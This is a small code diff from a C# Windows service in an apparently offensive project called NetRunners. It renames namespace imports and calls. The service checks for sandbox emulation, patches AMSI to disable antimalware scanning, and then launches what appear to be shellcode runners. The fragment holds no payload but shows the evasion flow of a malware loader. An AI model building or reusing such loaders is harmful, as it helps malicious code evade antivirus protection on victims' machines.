@@ -1,15 +1,7 @@
-﻿using System;
-using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Diagnostics;
-using System.Linq;
-using System.ServiceProcess;
-using System.Text;
-using System.Threading.Tasks;
-using static NetRunners.Runners;
-using static NetRunners.Heuristics;
-using static NetRunners.Patchers;
+﻿using System.ServiceProcess;
+using static NetRunners.Runners.Runners;
+using static NetRunners.Heuristics.Heuristics;
+using static NetRunners.Patchers.Patchers;
 
 namespace NetRunners
 {
@@ -32,12 +24,12 @@ namespace NetRunners
             if (NonEmulated()) { return; }    // if apis were not emulatd halt execution
 
             // call amsi patch
-            AmsiOs();
+            patchAmsi();
 
             // call desired function (uncomment choice)
             // PiRunner();
             // Runner();
-            EpsRunner();
+            epsRun();
         }
 
         protected override void OnStop()
